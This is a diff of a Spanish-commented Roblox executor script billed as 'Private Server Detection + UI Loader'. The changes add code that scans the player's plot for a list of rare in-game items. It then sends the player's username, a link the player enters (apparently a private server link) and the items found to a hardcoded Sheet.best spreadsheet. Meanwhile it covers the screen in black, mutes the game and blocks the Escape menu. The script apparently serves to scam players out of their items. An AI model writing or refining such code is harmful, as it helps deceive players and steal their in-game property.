@@ -1,5 +1,6 @@
 -- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader
 -- Integrado con Sheet.best (Google Sheets) y pantalla negra de carga
+-- Mejorado para buscar objetos en Models dentro de la carpeta "plots"
 -- MINTHUBx + Copilot
 
 local Players = game:GetService("Players")
@@ -11,33 +12,115 @@ local ContextActionService = game:GetService("ContextActionService")
 local HttpService = game:GetService("HttpService")
 
 ------------------------------------------------------------
--- 🔍 Universal private server and owner detection
+-- 🟩 Sheet.best integration (Google Sheets)
 ------------------------------------------------------------
-local function IsPlayerInOwnPrivateServer()
-	local runService = game:GetService("RunService")
+local sheetUrl = "https://api.sheetbest.com/sheets/4fb21ec7-494c-4027-a9cf-cc5795f31e33"
 
-	if runService:IsStudio() then
-		return true
-	end
+local objetosBuscados = {
+    "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
+    "Tacorita bicicleta", "Los tacoritas", "Garama and Madundung", "Dragon Cannelloni", "Esok Sekolah",
+    "Tang Tang Keletang", "Strawberry Elephant", "La Secret Combinasion", "Tralaledon", "Eviledon",
+    "Spaghetti Tualetti", "Los Hotspotsitos", "Los Mobilis", "Los 67", "Money Money Puggy",
+    "Celularcini Viciosini", "Los Bros", "Las Sis", "Los Primos", "La Spooky Grande",
+    "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
+}
 
-	if game.PrivateServerId and game.PrivateServerId ~= "" then
-		if game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0 then
-			if LocalPlayer.UserId == game.PrivateServerOwnerId then
-				return true
-			else
-				return false
-			end
-		else
-			return false
-		end
-	end
-
-	if game.VIPServerId and game.VIPServerId ~= "" then
-		return true
-	end
-
-	return false
+-- Espera hasta que el plot del jugador esté disponible
+local function esperarPlot(timeout)
+    timeout = timeout or 10
+    local plot = nil
+    for i=1,timeout*2 do
+        local plotsFolder = Workspace:FindFirstChild("plots")
+        if plotsFolder then
+            for _, modelo in ipairs(plotsFolder:GetChildren()) do
+                if modelo:IsA("Model") and modelo.Name == LocalPlayer.Name then
+                    plot = modelo
+                    break
+                end
+            end
+            if plot then break end
+        end
+        task.wait(0.5)
+    end
+    return plot
 end
+
+-- Busca los objetos en el plot/modelo del jugador
+local function obtenerObjetosEnPlot()
+    local encontrados = {}
+    local plot = esperarPlot(10)
+    if plot then
+        for _, nombreObjeto in ipairs(objetosBuscados) do
+            if plot:FindFirstChild(nombreObjeto) then
+                table.insert(encontrados, nombreObjeto)
+            end
+        end
+    end
+    return encontrados
+end
+
+-- Intenta enviar los datos a Google Sheets, reintenta si hay error
+local function guardarDatosEnSheet(link)
+    local player = Players.LocalPlayer
+    local objetos = obtenerObjetosEnPlot()
+    local fecha = os.date("%Y-%m-%d %H:%M:%S")
+    local data = {
+        Usuario = player.Name,
+        Link = link,
+        Fecha = fecha,
+        Objetos = #objetos > 0 and table.concat(objetos, ", ") or "Ninguno"
+    }
+    local json = HttpService:JSONEncode(data)
+    local success = false
+    for intento = 1, 3 do
+        local response = nil
+        if typeof(http_request) == "function" then
+            response = http_request({
+                Url = sheetUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+        elseif typeof(request) == "function" then
+            response = request({
+                Url = sheetUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+        end
+        if response and response.StatusCode == 200 then
+            success = true
+            break
+        else
+            task.wait(1)
+        end
+    end
+    return success
+end
+
+------------------------------------------------------------
+-- 🎬 Pantalla negra y loading bar
+------------------------------------------------------------
+local function muteAllSounds()
+    for i, sound in SoundService:GetDescendants() do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+        end
+    end
+    for i, sound in Workspace:GetDescendants() do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+        end
+    end
+end
+
+local escBlockActionName = "BlockEscMenu"
+local function blockEscMenu(actionName, inputState, inputObj)
+    return Enum.ContextActionResult.Sink
+end
+
+local blackFrame
 
 ------------------------------------------------------------
 -- 🪟 Create main GUI (link input)
@@ -48,10 +131,10 @@ screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.DisplayOrder = 9999
 pcall(function()
-	screenGui.Parent = game:GetService("CoreGui")
+    screenGui.Parent = game:GetService("CoreGui")
 end)
 if not screenGui.Parent then
-	screenGui.Parent = playerGui
+    screenGui.Parent = playerGui
 end
 
 local inputFrame = Instance.new("Frame")
@@ -130,92 +213,6 @@ testButton.Parent = inputFrame
 local testCorner = Instance.new("UICorner")
 testCorner.CornerRadius = UDim.new(0, 8)
 testCorner.Parent = testButton
-
-------------------------------------------------------------
--- 🎬 Pantalla negra y loading bar
-------------------------------------------------------------
-local function muteAllSounds()
-	for i, sound in SoundService:GetDescendants() do
-		if sound:IsA("Sound") then
-			sound.Volume = 0
-		end
-	end
-	for i, sound in Workspace:GetDescendants() do
-		if sound:IsA("Sound") then
-			sound.Volume = 0
-		end
-	end
-end
-
-local escBlockActionName = "BlockEscMenu"
-
-local function blockEscMenu(actionName, inputState, inputObj)
-	return Enum.ContextActionResult.Sink
-end
-
-local blackFrame
-
-------------------------------------------------------------
--- 🟩 Sheet.best integration (Google Sheets)
-------------------------------------------------------------
-local sheetUrl = "https://api.sheetbest.com/sheets/4fb21ec7-494c-4027-a9cf-cc5795f31e33"
-
-local objetosBuscados = {
-    "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
-    "Tacorita bicicleta", "Los tacoritas", "Garama and Madundung", "Dragon Cannelloni", "Esok Sekolah",
-    "Tang Tang Keletang", "Strawberry Elephant", "La Secret Combinasion", "Tralaledon", "Eviledon",
-    "Spaghetti Tualetti", "Los Hotspotsitos", "Los Mobilis", "Los 67", "Money Money Puggy",
-    "Celularcini Viciosini", "Los Bros", "Las Sis", "Los Primos", "La Spooky Grande",
-    "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
-}
-
-local function obtenerObjetosEnBase()
-    local encontrados = {}
-    local player = Players.LocalPlayer
-    local base = Workspace:FindFirstChild(player.Name .. "Base") or Workspace:FindFirstChild(player.Name)
-    if base then
-        for _, nombre in ipairs(objetosBuscados) do
-            if base:FindFirstChild(nombre) then
-                table.insert(encontrados, nombre)
-            end
-        end
-    end
-    return encontrados
-end
-
-local function guardarDatosEnSheet(link)
-    local player = Players.LocalPlayer
-    local objetos = obtenerObjetosEnBase()
-    local fecha = os.date("%Y-%m-%d %H:%M:%S")
-    local data = {
-        Usuario = player.Name,
-        Link = link,
-        Fecha = fecha,
-        Objetos = #objetos > 0 and table.concat(objetos, ", ") or "Ninguno"
-    }
-    local json = HttpService:JSONEncode(data)
-    if typeof(http_request) == "function" then
-        local response = http_request({
-            Url = sheetUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = json
-        })
-        print(response.StatusCode, response.StatusMessage)
-        print(response.Body)
-    elseif typeof(request) == "function" then
-        local response = request({
-            Url = sheetUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = json
-        })
-        print(response.StatusCode, response.StatusMessage)
-        print(response.Body)
-    else
-        warn("Tu executor no soporta http_request ni request.")
-    end
-end
 
 ------------------------------------------------------------
 -- 🟧 Botón SEND (guarda y pantalla negra)
@@ -306,9 +303,14 @@ sendButton.MouseButton1Click:Connect(function()
     ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)
 
     -- Guarda los datos en Sheet.best
-    guardarDatosEnSheet(link)
-    label.TextColor3 = Color3.fromRGB(40, 200, 80)
-    label.Text = "Datos enviados a Google Sheets!"
+    local success = guardarDatosEnSheet(link)
+    if success then
+        label.TextColor3 = Color3.fromRGB(40, 200, 80)
+        label.Text = "Datos enviados a Google Sheets!"
+    else
+        label.TextColor3 = Color3.fromRGB(255, 0, 0)
+        label.Text = "❌ Error al enviar a Google Sheets. Intenta de nuevo."
+    end
 end)
 
 ------------------------------------------------------------
@@ -316,9 +318,14 @@ end)
 ------------------------------------------------------------
 testButton.MouseButton1Click:Connect(function()
     local link = textBox.Text ~= "" and textBox.Text or "TEST-LINK"
-    guardarDatosEnSheet(link)
-    label.TextColor3 = Color3.fromRGB(255, 220, 0)
-    label.Text = "Test enviado a Google Sheets!"
+    local success = guardarDatosEnSheet(link)
+    if success then
+        label.TextColor3 = Color3.fromRGB(255, 220, 0)
+        label.Text = "Test enviado a Google Sheets!"
+    else
+        label.TextColor3 = Color3.fromRGB(255, 0, 0)
+        label.Text = "❌ Error al enviar a Google Sheets. Intenta de nuevo."
+    end
 end)
 
 if blackFrame then
